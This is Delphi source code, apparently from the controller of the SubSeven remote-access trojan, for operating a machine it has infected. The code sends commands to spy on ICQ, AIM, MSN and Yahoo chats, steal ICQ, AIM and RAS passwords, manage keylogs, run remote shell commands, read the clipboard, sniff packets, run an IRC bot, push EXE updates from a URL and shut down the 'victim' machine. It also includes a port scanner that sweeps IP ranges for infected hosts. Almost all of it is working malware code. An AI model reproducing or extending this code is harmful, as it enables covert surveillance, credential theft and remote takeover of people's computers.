procedure TMainForm.OutlookBtn98Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('2.0') then exit;
  ClientSocket.Socket.SendText('GHI');
  Status.Caption:='receiving home information...';
  StartAnimation;
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.LoadHTML(care:integer;add:bool);
var l:integer;
    t:AnsiString;
begin
  l:=length(SpyFormAIM[care].T_X_T_Old.Lines.Text)-20;
 if ServerVersion='2.0' then begin
  l:=length(SpyFormAIM[care].T_X_T_Old.Lines.Text)-6;
  if (not add) then SpyFormAIM[care].T_X_T_Old.Lines.Text:=SpyMemo.Lines.Text else
   SpyFormAIM[care].T_X_T_Old.Lines.Text:=copy(SpyFormAIM[care].T_X_T_Old.Lines.Text,1,l)+SpyMemo.Lines.Text;
  SpyFormAIM[care].T_X_T_Old.SelStart:=Length(SpyFormAIM[care].T_X_T_Old.Lines.Text)-6;
  SpyFormAIM[care].T_X_T_Old.sellength:=1;
end else begin
// showmessage(spymemo.lines.text);
 if (not add) then begin
  case SpyFormAIM[care].ToolBarButton971.ImageIndex of
   0:begin SpyFormAIM[care].T_X_T.LoadStrings(SpyMemo.Lines);
           SpyFormAIM[care].T_X_T_Old.Lines.Text:=SpyMemo.Lines.Text;end;
   1,2:SpyFormAIM[care].T_X_T_Old.Lines.Text:=SpyMemo.Lines.Text;
  end;
  end else begin
  case SpyFormAIM[care].ToolBarButton971.ImageIndex of
   0:begin l:=Pos('</BODY>',SpyFormAIM[care].T_X_T_Old.Lines.Text);if l<>0 then begin
           t:=Copy(SpyFormAIM[care].T_X_T_Old.Lines.Text,1,l-1);SpyFormAIM[care].T_X_T_Old.Lines.Text:=t;end;
           SpyFormAIM[care].T_X_T_Old.Lines.Text:=SpyFormAIM[care].T_X_T_Old.Lines.Text+SpyMemo.Lines.Text;
           SpyFormAIM[care].T_X_T.LoadStrings(SpyFormAIM[care].T_X_T_Old.Lines);end;
   1,2:begin l:=length(SpyFormAIM[care].T_X_T_Old.Lines.Text)-6;
       SpyFormAIM[care].T_X_T_Old.Lines.Text:=copy(SpyFormAIM[care].T_X_T_Old.Lines.Text,1,l)+SpyMemo.Lines.Text;end;
  end;
  end;
end;
 try SpyFormAIM[care].T_X_T.VScrollBarPosition:=SpyFormAIM[care].T_X_T.VScrollBarRange;except end;
 try SpyFormAIM[care].T_X_T_Old.SelStart:=Length(SpyFormAIM[care].T_X_T_Old.Lines.Text)-6;
 SpyFormAIM[care].T_X_T_Old.sellength:=1;except end;
end;

procedure TMainForm.CheckSpies(filename:string);
var f,tmpf:textfile;
    COD,name,temp,tmpname:string;
    i:integer;
    Terminat,done,DoADD,Primu:bool;
begin
 Primu:=True;
repeat
 tmpname:=winpath+'\d.$';
 done:=false;Terminat:=False;
 SpyMemo.Lines.Clear;
 if FileExists(tmpname) then try DeleteFile(tmpname);except end;assignfile(tmpf,tmpname);rewrite(tmpf);
if Primu then begin
 AssignFile(f,FileName);
 Reset(f);
 ReadLn(f,COD);
end;
 ReadLn(f,COD);WriteLn(tmpf,COD);
 ReadLn(f,name);WriteLn(tmpf,name);
 ReadLn(f,temp);WriteLn(tmpf,temp);
 if temp='ADD' then DoADD:=true else DoADD:=False;
 repeat
  ReadLn(f,temp);WriteLn(tmpf,temp);
  SpyMemo.Lines.Add(temp);
 until eof(f) OR (TEMP='--NEW--');
 if eof(f) then Terminat:=True;
 if Terminat then CloseFile(f);
 CloseFile(tmpf);
 Primu:=False;
 if ((COD='MSG') or (cod='URL') or (cod='WWP')) then ICQForm.AddToMemo(TMPname) else
begin
 if ((COD='AIM') or (COD='MSN') or (COD='YH!')) then
 begin
  for i:=1 to 20 do if (SpyFormName2[i]=NAME) then
   begin
    LoadHTML(i,DoADD);
    SpyFormAIM[i].Show;
    done:=true;
    break;
   end;
   if not done then
    for i:=1 to 20 do if SpyFormName2[i]='' then
     begin
      SpyFormAIM[i]:=TAIMForm.Create(Application);
      SpyFormName2[i]:=NAME;
      SpyFormAIM[i].Tag:=i;
      SpyFormAIM[i].CuCine.Caption:=NAME;
      if COD='MSN' then SpyFormAIM[i].Caption:='msn messenger' else
      if COD='YH!' then SpyFormAIM[i].Caption:='yahoo! messenger' else
      if COD='AIM' then SpyFormAIM[i].Caption:='aol instant messenger';
      SpyFormAIM[i].CaptionLabel.Caption:=SpyFormAIM[i].Caption;
      if COD='MSN' then SpyFormAIM[i].ToolBarButton971.ImageIndex:=1 else
      if COD='YH!' then SpyFormAIM[i].ToolBarButton971.ImageIndex:=2 else
      if COD='AIM' then SpyFormAIM[i].ToolBarButton971.ImageIndex:=0;
      if ((ServerVersion='2.0') OR (COD<>'AIM')) then
       begin
        SpyFormAIM[i].T_X_T_Old.Visible:=True;
        SpyFormAIM[i].T_X_T.Visible:=False;
        SpyFormAIM[i].Panel1.Visible:=False;
       end;
      LoadHTML(i, False);
      SpyFormAIM[i].Show;
      done:=true;
      break;
     end;
  end;
 end;
until Terminat;
try DeleteFile(FileName);except end;
end;

procedure TMainForm.SpySocketRead(Sender: TObject;
  Socket: TCustomWinSocket);
var Stream:TMemoryStream;
    nReceived,totalrecv,total,no,i: Integer;
    undesalveaza,StrIn,totalbytes:String;
    evreuna:boolean;
begin
  if receivingmsg then exit;
  UndeSalveaza:=MainForm.DownloadFolder;
  Socket.ReceiveBuf (Buffer, 5);
  strIn := Copy (Buffer, 1, 5);
  evreuna:=false;
  if copy(strin,1,3)='ICQ' then evreuna:=true;
  if not evreuna then exit;
  receivingmsg:=true;
  try no:=StrToInt(copy(strIN,4,2)); except end;
  totalbytes:='';
 try for i:=1 to no do
   begin
    Socket.ReceiveBuf (Buffer, 1);
    strIn := Copy (Buffer, 1, 1);
    totalbytes:=totalbytes+strIN;
   end;
   except
   end;
  total:=StrToInt(totalbytes);
 Stream := TMemoryStream.Create;
 totalrecv:=0;
 try
  while (totalrecv<total) do begin
   Application.ProcessMessages;
   nReceived := Socket.ReceiveBuf (Buffer, sizeof (Buffer));
   if nReceived>0 then
   begin
    Stream.Write (Buffer, nReceived);
    totalrecv:=totalrecv+nreceived;
   end;
  end;
  Stream.Position := 0;
  if FileExists(undesalveaza+'ICQSpy.txt') then try DeleteFile(undesalveaza+'ICQSpy.txt');except end;
  Stream.SaveToFile(undesalveaza+'ICQSpy.txt');
  CheckSpies(undesalveaza+'ICQSpy.txt');
//  {{{{{{{{{{{{{{{}AddToMemo(undesalveaza+'ICQSpy.txt');
 finally
  Stream.Free;
  receivingmsg:=false;
 end;
end;

procedure TMainForm.OutlookBtn100Click(Sender: TObject);
begin
 SpyPort:=FlatEdit30.Text;
 SendCommand('SPY1ICQ1'+SpyPort,'trying to enable icq spy...','2.0');
 try SpySocket.Port:=StrToInt(SpyPort);except end;
end;


procedure TMainForm.OutlookBtn101Click(Sender: TObject);
var i:integer;doit:bool;bit:string[1];
begin
 Spies[1]:=False;SetStatus;
 doit:=true;for i:=1 to SpyNo do if (Spies[i]) then doit:=false;
 if doit then SpySocket.Active:=False;
 if doit then bit:='0' else bit:='1';
 SendCommand('SPY'+bit+'ICQ0','trying to disable icq spy...','2.0');
end;


procedure TMainForm.OutlookBtn102Click(Sender: TObject);
begin
 SpyPort:=FlatEdit30.Text;
 SendCommand('SPY1AIM1'+SpyPort,'trying to enable aim spy...','2.0');
 try SpySocket.Port:=StrToInt(SpyPort);except end;
end;

procedure TMainForm.OutlookBtn105Click(Sender: TObject);
begin
 SpyPort:=FlatEdit30.Text;
 SendCommand('SPY1MSN1'+SpyPort,'trying to enable msn spy...','2.0');
 try SpySocket.Port:=StrToInt(SpyPort);except end;
end;

procedure TMainForm.OutlookBtn103Click(Sender: TObject);
var i:integer;doit:bool;bit:string[1];
begin
 Spies[2]:=False;SetStatus;
 doit:=true;for i:=1 to SpyNo do if (Spies[i]) then doit:=false;
 if doit then SpySocket.Active:=False;
 if doit then bit:='0' else bit:='1';
 SendCommand('SPY'+bit+'AIM0','trying to disable aim spy...','2.0');
end;

procedure TMainForm.OutlookBtn106Click(Sender: TObject);
var i:integer;doit:bool;bit:string[1];
begin
 Spies[3]:=False;SetStatus;
 doit:=true;for i:=1 to SpyNo do if (Spies[i]) then doit:=false;
 if doit then SpySocket.Active:=False;
 if doit then bit:='0' else bit:='1';
 SendCommand('SPY'+bit+'MSN0','trying to disable msm spy...','2.0');
end;

procedure TMainForm.OutlookBtn108Click(Sender: TObject);
begin
 SpyPort:=FlatEdit30.Text;
 SendCommand('SPY1YH!1'+SpyPort,'trying to enable yahoo spy...','2.0');
 try SpySocket.Port:=StrToInt(SpyPort);except end;
end;

procedure TMainForm.OutlookBtn109Click(Sender: TObject);
var i:integer;doit:bool;bit:string[1];
begin
 Spies[3]:=False;SetStatus;
 doit:=true;for i:=1 to SpyNo do if (Spies[i]) then doit:=false;
 if doit then SpySocket.Active:=False;
 if doit then bit:='0' else bit:='1';
 SendCommand('SPY'+bit+'YH!0','trying to disable yahoo spy...','2.0');
end;

procedure TMainForm.SetStatus;
var news:string;
begin
 news:='status: ';
 news:=news+'[ICQ: ';if Spies[1] then news:=news+'on' else news:=news+'off';news:=news+'] ';
 news:=news+'[AIM: ';if Spies[2] then news:=news+'on' else news:=news+'off';news:=news+'] ';
 news:=news+'[MSM: ';if Spies[3] then news:=news+'on' else news:=news+'off';news:=news+'] ';
 news:=news+'[Yahoo!: ';if Spies[4] then news:=news+'on' else news:=news+'off';news:=news+']';
 Label82.Caption:=news;
end;

procedure TMainForm.OutlookBtn104Click(Sender: TObject);
begin
 SendCommand('GIP','retrieving icq passwords...','2.0');
end;

procedure TMainForm.OutlookBtn107Click(Sender: TObject);
begin
 SendCommand('GAP','retrieving aim passwords...','2.0');
end;

procedure TMainForm.RxSlider2Change(Sender: TObject);
begin
 Label85.Caption:=IntToStr(RxSlider2.Value);
end;

procedure TMainForm.OutlookBtn113Click(Sender: TObject);
begin
 SendCommand('RWN5','shutting down windows...','2.0');
end;

procedure TMainForm.OutlookBtn110Click(Sender: TObject);
begin
 SendCommand('RWN2','logging off windows user...','2.0');
end;

procedure TMainForm.OutlookBtn111Click(Sender: TObject);
begin
 SendCommand('RWN3','shutting down windows...','2.0');
end;

procedure TMainForm.OutlookBtn112Click(Sender: TObject);
begin
 SendCommand('RWN4','rebooting windows...','1.0');
end;

procedure TMainForm.OutlookBtn114Click(Sender: TObject);
var bit:string[1];
begin
if KeepConnectedIP='127.0.0.1' then showmsg('when testing the matrix on yourself, it''ll be displayed smaller so you can close it.');
 if KeepConnectedIP='127.0.0.1' then bit:='1' else bit:='0';
 try MatrixSock.Port:=StrToInt(MatrixPort);except end;
 SendCommand('IMX'+bit+FalDe(MatrixPort,2)+MatrixPort+Memo2.Lines.Text,'activating the matrix...','2.0');
end;

procedure TMainForm.MatrixSockRead(Sender: TObject;
  Socket: TCustomWinSocket);
var s:string;
    i:integer;
begin
 s:=Socket.ReceiveText;
 repeat
   if (s[1]<>'ô') and (s[1]<>'ö')
    then TheMatrix.Memo1.Text:=TheMatrix.Memo1.Text+S[1]
   else if (s[1]='ô') then
    TheMatrix.Memo1.Lines.Text:=Copy(TheMatrix.Memo1.Lines.Text,1,length(TheMatrix.Memo1.Lines.Text)-1)
   else TheMatrix.Memo1.Lines.Text:=TheMatrix.Memo1.Lines.Text+#13#10;
  Delete(s,1,1);
 until s='';
 TheMatrix.Memo1.SelStart:=Length(TheMatrix.Memo1.Lines.Text)-1;
 TheMatrix.Memo1.SelLength:=1;
end;

procedure TMainForm.FlatEdit28Change(Sender: TObject);
begin
 MatrixPort:=FlatEdit28.Text;
end;

procedure TMainForm.FlatEdit29Change(Sender: TObject);
begin
 KeyzPort:=FlatEdit29.Text;
end;

procedure TMainForm.FlatEdit30Change(Sender: TObject);
begin
 SpyPort:=FlatEdit30.Text;
end;

procedure TMainForm.SpySocketDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var i:integer;
begin
 for i:=1 to SpyNo do Spies[i]:=False;SetStatus;
end;

procedure TMainForm.FlatEdit16Change(Sender: TObject);
begin
if FlatCheckBox13.Checked then
 FlatEdit31.Text:='ftp://pass:pass@'+KeepConnectedIP+':'+FlatEdit16.Text
else
 FlatEdit31.Text:='ftp://'+flatedit17.text+':'+flatedit17.text+'@'+KeepConnectedIP+':'+FlatEdit16.Text
end;

procedure TMainForm.FlatEdit17Change(Sender: TObject);
begin
if FlatCheckBox13.Checked then
 FlatEdit31.Text:='ftp://pass:pass@'+KeepConnectedIP+':'+FlatEdit16.Text
else
 FlatEdit31.Text:='ftp://'+flatedit17.text+':'+flatedit17.text+'@'+KeepConnectedIP+':'+FlatEdit16.Text
end;

procedure TMainForm.OutlookBtn8Click(Sender: TObject);
begin
 SendCommand('CKL','clearing logged keys...','2.0');
end;
procedure TMainForm.FlatCheckBox13Click(Sender: TObject);
begin
 if FlatCheckBox13.Checked then FlatEdit17.PasswordChar:='*' else FlatEdit17.PasswordChar:=#0;
 if FlatCheckBox13.Checked then
  FlatEdit31.Text:='ftp://pass:pass@'+KeepConnectedIP+':'+FlatEdit16.Text
 else
  FlatEdit31.Text:='ftp://'+flatedit17.text+':'+flatedit17.text+'@'+KeepConnectedIP+':'+FlatEdit16.Text
end;

procedure TMainForm.OutlookBtn115Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('2.0') then exit;
 InitiateTransfer;
 Memo3.Clear;
 ClientSocket.Socket.SendText('DOS'+FlatEdit33.Text);
 Status.Caption:='running redirected dos command...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn116Click(Sender: TObject);
begin
 About.GET_MOTD(2);
end;

procedure TMainForm.MinimizeIT;
begin
 MinimizeButtonClick(Sender);
end;

procedure TMainForm.OutlookBtn117Click(Sender: TObject);
begin
 hidMemo.Clear;
 hidMemo.Lines.Add(ip1.text);hidMemo.Lines.Add(ip2.text);hidMemo.Lines.Add(ip3.text);
 hidMemo.Lines.Add(eip1.text);hidMemo.Lines.Add(eip2.text);hidMemo.Lines.Add(eip3.text);
 hidMemo.Lines.Add(FlatEdit32.Text);hidMemo.Lines.Add(RxSpinEdit1.Text);
 SendCommand('RIS'+hidMemo.Lines.Text,'starting remote scanner...','2.1');
 hidMemo.Clear;
end;

function RemoveEndOfLine(const Line : String) : String;
begin
 if (Length(Line) >= Length(eol)) and (StrLComp(@Line[1 + Length(Line) - Length(eol)],
     @eol[1], Length(eol)) = 0) then Result := Copy(Line, 1, Length(Line) - Length(eol))
 else Result := Line;
end;

procedure hunt(Sender : TObject;Error: word);
var
    Buf : array [0..127] of char;
    Len : Integer;
    k : Integer;
    sx,prt,q    : string;
begin
 Len := TCustomLineWSocket(Sender).Receive(@Buf, Sizeof(Buf) - 1);
 if Len <= 0 then Exit;
 Buf[Len] := #0;
 sx:=TWSocket(Sender).addr;
{ sx:=sx+' - '+MainForm.FlatEdit32.Text;}
{ sx:=sx+' ['+RemoveEndOfLine(StrPas(@Buf)+']');}
 MainForm.Memo4.Lines.add(sx);
end;

procedure TMainForm.hunt1DataAvailable(Sender: TObject; Error: Word);
begin
 hunt(Sender,error);
end;

procedure eroare;
begin
 MainForm.showmsg('invalid IP values');
 err_val:=true;
 exit;
end;

Procedure afis;
begin
 if MainForm.pb.Progress<k then MainForm.pb.progress:=k
end;

procedure TMainForm.WaitFor(msecs:integer);
var
   FirstTickCount:longint;
begin
     FirstTickCount:=GetTickCount;
     repeat
      if (over) and (gata) then exit;
           Application.ProcessMessages; {allowing access to other
                                         controls, etc.}
     until ((GetTickCount-FirstTickCount) >= Longint(msecs));
end;

procedure TMainForm.huntbClick(Sender: TObject);
begin
 val(ip1.text,x1,i);
 val(ip2.text,x2,i);
 val(ip3.text,x3,i);
 val(eip1.text,y1,i);
 val(eip2.text,y2,i);
 val(eip3.text,y3,i);
 val(ip4.text,startip,i);
 val(eip4.text,endip,i);
 err_val:=false;
 if (startip>endip) or (startip>255) or (endip>255) or (startip<0) or (endip<0) or (x1<0) or (x2<0) or (x3<0) or (y1<0) or (y2<0) or (y3<0) or (x1>255) or (x2>255) or (x3>255) or (y1>255) or (y2>255) or (y3>255) or
  (y1<x1) or (y2<x2) or (y3<x3) then eroare;
 if err_val then exit;
 huntb.enabled:=false;
 abortb.enabled:=true;
 over:=false;
 gata:=false;
 if endip=255 then endip:=endip-1;
 pb.maxvalue:=endip;
 pb.minvalue:=startip;
{ pb.position:=0;}
 delay:=Round(RxSpinEdit1.Value)*1000;
 if endip-startip > max_hunters then
 begin
  how_long:=max_hunters;
  no_need:=false;
 end else if endip-startip < max_hunters then
  begin
   how_long:=endip-startip+1;
   no_need:=true;
  end;
 if endip=startip then
  begin
   how_long:=1;
   no_need:=true;
  end;

for q1:=x1 to y1 do
for q2:=x2 to y2 do
for q3:=x3 to y3 do
 begin
  Application.ProcessMessages;
  if over then break;
  str(q1,sx1);
  str(q2,sx2);
  str(q3,sx3);
  iplow:=sx1+'.'+sx2+'.'+sx3;
  Status.caption:='scanning '+iplow+'.*';
  cport:=FlatEdit32.Text;
  gata:=false;
  pb.Progress:=0;
  Application.ProcessMessages;
  for i:=1 to how_long do
   begin
    try
     k:=startip-1+i;
     cip:=k;
     hunters[i].close;
     hunters[i].Proto:='tcp';
     hunters[i].port:=cport;
     str(k,s);
     huntpos[i]:=k;
     hunters[i].addr:=iplow+'.'+s;
     afis;
     hunters[i].connect;
     if over then break;
    except end;
   end;
   gata:=false;
   timer1.Enabled:=true;
   timer1.Interval:=delay;
   repeat
    application.processmessages;
   until (gata=true) or (over=true);
   if not over then WaitFor(delay);
 end;

if over then Status.Caption:='scanning aborted.' else Status.Caption:='scanning finished.';
timer1.Enabled :=false;
abortb.enabled:=false;
huntb.enabled:=true;
pb.Progress:=0;
for i:=1 to how_long do hunters[i].close;
end;

procedure TMainForm.Timer1Timer(Sender: TObject);
begin
try
 for i:=1 to max_hunters do
  if (huntpos[i]+max_hunters) <= 254 then
   begin
    hunters[i].close;
    hunters[i].port:=cport;
    hunters[i].Proto:='tcp';
    huntpos[i]:=huntpos[i]+max_hunters;
    k:=huntpos[i];
    str(k,s);
    hunters[i].addr:=iplow+'.'+s;
    afis;
    hunters[i].connect;
   end else begin
    gata:=true;
    break;
   end;
 except end;
end;

procedure TMainForm.abortbClick(Sender: TObject);
begin
 over:=true;
 gata:=true;
end;

procedure TMainForm.OutlookBtn118Click(Sender: TObject);
begin
 SendCommand('HGU','disconnecting victim...','1.4');
end;

procedure TMainForm.TimeOutTimer(Sender: TObject);
var
  Code : Integer;
begin
{  TimeOut.Enabled := False;
  ClientSocket.Close;
  TimeOut.Enabled := False;
  ClientSocketError(ClientSocket, ClientSocket.Socket, eeConnect, Code);
  TimeOut.Enabled := False;}
end;

procedure TMainForm.FlatEdit11Change(Sender: TObject);
begin
 NickName:=FlatEdit11.Text;
end;

procedure TMainForm.ToolbarButton971Click(Sender: TObject);
begin
 AddressBook.Show;
end;

procedure TMainForm.OutlookBtn121Click(Sender: TObject);
begin
 AddPort.ShowModal;
end;

procedure TMainForm.OutlookBtn119Click(Sender: TObject);
begin
 PortList.Items.Clear;
 MainForm.SendCommand('GPR','refreshing...','2.1');
end;

function TMainForm.CurentNum:integer;
var i:integer;
begin
result:=-1;
for i:=0 to PortList.Items.Count do
 if PortList.Selected=PortList.Items[i] then begin result:=i+1;break;end;
end;

procedure TMainForm.OutlookBtn120Click(Sender: TObject);
begin
 if PortList.ItemFocused = NIL then Exit;
 SendCommand('SPR'+PortList.Selected.Caption,'stopping redirected port...','2.1');
 PortList.Selected.Delete;
end;

procedure TMainForm.OutlookBtn122Click(Sender: TObject);
begin
 ICQList.Items.Clear;
 MainForm.SendCommand('IUL','reading installed UINs...','2.1');
end;

procedure TMainForm.OutlookBtn123Click(Sender: TObject);
begin
 if ICQList.ItemFocused = NIL then Exit;
 MainForm.SendCommand('TOI'+ICQList.Selected.Caption,'getting database size...','2.1');
end;

procedure TMainForm.OutlookBtn124Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('2.1') then exit;
  try InitiateTransfer;except end;
  ClientSocket.Socket.SendText('RAS');
  Status.Caption:='receiving RAS passwords...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.CloseRAS(Sender:TObject);
begin
// try RAS.Hide;except end;
 try RAS.Close;except end;
// try RAS.Free;except end;
end;

procedure TMainForm.LoadRASPasswords;
begin
 try RAS.Free;except end;
 try RAS:=TDispInfo.Create(self);except end;
{ RAS.OutLookBtn1.Visible:=False;
 RAS.OutLookBtn2.Visible:=False;
 RAS.memo.ScrollBars:=ssNone;
 RAS.memo.height:=RAS.memo.height+30;}
 RAS.Memo.Lines.Clear;
 RAS.Memo.Lines.LoadFromFile(DownloadFolder+'RAS.TXT');
 RAS.CaptionLabel.Caption:='RAS passwords';
 RAS.Caption:='RAS passwords';
 RAS.SaveLoggedKeys.FileName:='RAS.TXT';
 RAS.OnHide:=CloseRAS;
 RAS.Show;
end;

var spch:TDirectSS;

procedure TMainForm.OutlookBtn127Click(Sender: TObject);
var i:integer;
begin
 try spch.Free;except end;
 try spch:=TDirectSS.Create(self);except ShowMsg('text2speech engine not found on local computer.');end;
 i:=5;
 Spch.Gender(10,i);
 try spch.sayit:=SpeechMemo.lines.text;except ShowMsg('error saying text.');end;
end;

procedure TMainForm.OutlookBtn128Click(Sender: TObject);
begin
 SendCommand('RCT','reading clipboard text...','2.1');
end;

procedure TMainForm.OutlookBtn129Click(Sender: TObject);
begin
 SendCommand('SCT'+Memo5.Lines.Text,'reading clipboard text...','2.1');
end;

procedure TMainForm.OutlookBtn130Click(Sender: TObject);
begin
 SendCommand('CCT','emptying clipboard ...','2.1');
end;

procedure TMainForm.IPToolButtonClick(Sender: TObject);
begin
 Anim.Animeaza(IPTool);
end;

procedure TMainForm.ip1Change(Sender: TObject);
begin
 eip1.text:=ip1.text;
end;

procedure TMainForm.ip2Change(Sender: TObject);
begin
 eip2.text:=ip2.text;
end;

procedure TMainForm.ip3Change(Sender: TObject);
begin
 eip3.text:=ip3.text;
end;

procedure TMainForm.OutlookBtn131Click(Sender: TObject);
begin
 SendCommand('SIS','stopping ip scanner...','2.1');
end;

procedure TMainForm.OutlookBtn125Click(Sender: TObject);
begin
 SendCommand('TTS','checking to see if text2speech is installed...','2.1');
end;

procedure TMainForm.OutlookBtn126Click(Sender: TObject);
begin
 SendCommand('SAY'+SpeechMemo.Lines.Text,'saying specified text...','2.1');
end;

procedure TMainForm.SpySocketConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
// showmessage('socket connected');
end;

procedure TMainForm.restore1Click(Sender: TObject);
begin
 if Visible then
 begin
  if (not FlatCheckBox5.Checked) then Application.Minimize else begin
   Hide;
   TrayIcon.Active:=True;
  end;
 end else begin
  Application.Restore;
  Show;
 end; 
end;

procedure TMainForm.help1Click(Sender: TObject);
begin
 ShellExecute(0,PChar('open'),PChar('http://subseven.slak.org/help.html'),'','',SW_SHOW);
end;

procedure TMainForm.www1Click(Sender: TObject);
begin
 ShellExecute(0,PChar('open'),PChar('http://subseven.slak.org'),'','',SW_SHOW);
end;

procedure TMainForm.portEditKeyPress(Sender: TObject; var Key: Char);
begin
 if key=#13 then begin key:=#3;ConnectButtonClick(sender);end;
end;

procedure TMainForm.OutlookBtn133Click(Sender: TObject);
begin
 hidMemo.Lines.Clear;
 hidMemo.Lines.Add(FlatEdit35.Text);
 hidMemo.Lines.Add(FlatEdit36.Text);
 hidMemo.Lines.Add(FlatEdit37.Text);
 hidMemo.Lines.Add(FlatEdit38.Text);
 hidMemo.Lines.Add(FlatEdit39.Text);
 hidMemo.Lines.Add(FlatEdit40.Text);
 hidMemo.Lines.Add(FlatEdit41.Text);
 if FlatCheckBox14.Checked then hidMemo.Lines.Add('yes') else hidMemo.Lines.Add('no');
 hidMemo.Lines.Add(BotCommands.Lines.Text);
 SendCommand('BOT'+hidMemo.Lines.Text,'starting IRC bot...','2.1');
end;

procedure TMainForm.OutlookBtn132Click(Sender: TObject);
begin
 SendCommand('BTR','gettin irc bot status...','2.1');
end;

procedure TMainForm.OutlookBtn134Click(Sender: TObject);
begin
 SendCommand('BTS','disconnecting IRC bot...','2.1');
end;

procedure TMainForm.OutlookBtn135Click(Sender: TObject);
var f:textfile;
    fn:string;
begin
 if not SaveBot.Execute then Exit;
 fn:=SaveBOT.FileName;
 if FileExists(fn) and (not AreYouSure('file exists. overwrite?')) then Exit;
 AssignFile(f,fn);
 Rewrite(f);
 WriteLn(f,FlatEdit35.Text);
 WriteLn(f,FlatEdit36.Text);
 WriteLn(f,FlatEdit37.Text);
 WriteLn(f,FlatEdit38.Text);
 WriteLn(f,FlatEdit39.Text);
 WriteLn(f,FlatEdit40.Text);
 WriteLn(f,FlatEdit41.Text);
 if FlatCheckBox14.Checked then WriteLn(f,'yes') else WriteLn(f,'no');
 for i:=0 to BotCommands.Lines.Count-1 do
  WriteLn(f,BotCommands.Lines[i]);
 CloseFile(f); 
end;

procedure TMainForm.OutlookBtn136Click(Sender: TObject);
var f:textfile;
    fn:string;
begin
 if not LoadBot.Execute then Exit;
 fn:=LoadBOT.FileName;
 AssignFile(f,fn);
 try Reset(f);
 ReadLn(f,fn);FlatEdit35.Text:=fn;
 ReadLn(f,fn);FlatEdit36.Text:=fn;
 ReadLn(f,fn);FlatEdit37.Text:=fn;
 ReadLn(f,fn);FlatEdit38.Text:=fn;
 ReadLn(f,fn);FlatEdit39.Text:=fn;
 ReadLn(f,fn);FlatEdit40.Text:=fn;
 ReadLn(f,fn);FlatEdit41.Text:=fn;
 ReadLn(f,fn);
 if fn='yes' then FlatCheckBox14.Checked:=True else FlatCheckBox14.Checked:=False;
 BotCommands.Lines.Clear;
 while not eof(f) do
  begin
   ReadLn(f,fn);BotCommands.Lines.Add(fn);
  end;
 finally
  CloseFile(f);
 end; 
end;

procedure TMainForm.OutlookBtn137Click(Sender: TObject);
var pcf:Textfile;i:integer;
    keep1,keep2:WideString;
begin
 SaveSettings.DefaultExt:='txt';
 SaveSettings.FileName:='pc info';
 SaveSettings.Filter:='text files|*.txt|all files|*.*';
 if SaveSettings.Execute then
 begin
  keep1:=InfoLabel.Caption;
  keep2:=_InfoLabel.Caption;
  InfoLabel.Caption:=InfoLabel.Caption+#13#10;
  _InfoLabel.Caption:=_InfoLabel.Caption+#13#10;
  if FileExists(SaveSettings.FileName) then try DeleteFile(SaveSettings.FileName);except end;
  AssignFile(pcf,SaveSettings.FileName);Rewrite(pcf);
  WriteLn(pcf,'SubSeven pc info for '+KeepConnectedIP);
  WriteLn(pcf,'saved on '+DateToStr(now));
  WriteLn(pcf,'');
  for i:=1 to 16 do
  begin
   WriteLn(pcf,Copy(_InfoLabel.Caption,1,Pos(#13#10,_InfoLabel.Caption)-1)+' '+Copy(InfoLabel.Caption,1,Pos(#13#10,InfoLabel.Caption)-1));
   InfoLabel.Caption:=Copy(InfoLabel.Caption,Pos(#13#10,InfoLabel.Caption)+2,256);
   _InfoLabel.Caption:=Copy(_InfoLabel.Caption,Pos(#13#10,_InfoLabel.Caption)+2,256);
  end;
  CloseFile(pcf);
  InfoLabel.Caption:=keep1;
  _InfoLabel.Caption:=keep2;
 end;
 SaveSettings.FileName:='';
 SaveSettings.DefaultExt:='s7m';
 SaveSettings.Filter:='sub7 menu files|*.s7m|all files|*.*';

end;

procedure TMainForm.ToolbarButton971MouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 if Button=mbRight then AddressBook.ToolbarButton971Click(Self);
end;

procedure TMainForm.hunt1DnsLookupDone(Sender: TObject; Error: Word);
begin
 if Error = 0 then begin
  IPTool.DisplayMemo.Lines.Add('ip resolved to: ''' +hunt1.DnsResult+ ''' ('+IntToStr(hunt1.DnsResultList.Count)+' addresses).');
  IPTool.DisplayMemo.Lines.Text:=IPTool.DisplayMemo.Lines.Text+hunt1.DnsResultList.Text;
  IPTool.FlatEdit32.Text:=hunt1.DnsResult;
  IPTool.DisplayMemo.Lines.Add('');
 end else
  IPTool.DisplayMemo.Lines.Add('dns not found. error #'+IntToStr(Error)+'.');
end;

procedure TMainForm.OutlookBtn138Click(Sender: TObject);
var gt:string;
begin
 GetTextForm.GetText('update from URL','URL:','',false,gt);
 if gt='' then exit;
 if (UpperCase(Copy(GT,length(GT)-3,length(GT)))<>'.EXE') then
  ShowMsg('the url has to be an EXE file.')
 else SendCommand('UFU'+GT,'updating from URL...','2.1'); 
end;

procedure TMainForm.OutlookBtn139Click(Sender: TObject);
begin
 ButtonFontName:='';
 ButtonFontSize:=0;
 ButtonFontAttr:='';
 SetDefaultColors;
 SetTheColors;SaveColors;
end;

procedure TMainForm.OutlookBtn140Click(Sender: TObject);
var p:string;
begin
 if Length(FlatCombobox3.Text)<2 then
  begin ShowMsg('pick an adapter to sniff. click "refresh" to refresh the list of adapters.');end;
 if FlatRadioButton10.Checked then P:='1' else P:='0';
 P:=P+ListBox2.Items.Text;
 SendCommand('RPS'+IntToStr(FlatComboBox3.ItemIndex)+IntToStr(Length(FlatEdit42.Text))+FlatEdit42.Text+P,'starting packet sniffer...','2.1');
end;

procedure TMainForm.OutlookBtn142Click(Sender: TObject);
begin
 SendCommand('RAL','refreshing adapter list...','2.1');
end;

procedure TMainForm.FlatComboBox3KeyPress(Sender: TObject; var Key: Char);
begin
 key:=#0;
end;

procedure TMainForm.OutlookBtn143Click(Sender: TObject);
var res:string;
    i:integer;
begin
 GetTextForm.GetText('sniff port', 'port: ','',false, res);
 if res='' then exit;
 try strtoint(res);except showmsg('invalid entry');exit;end;
 ListBox2.Items.Add(res);
end;

procedure TMainForm.OutlookBtn144Click(Sender: TObject);
begin
 if ListBox2.ItemIndex=-1 then begin showmsg('select a port to delete');exit;end;
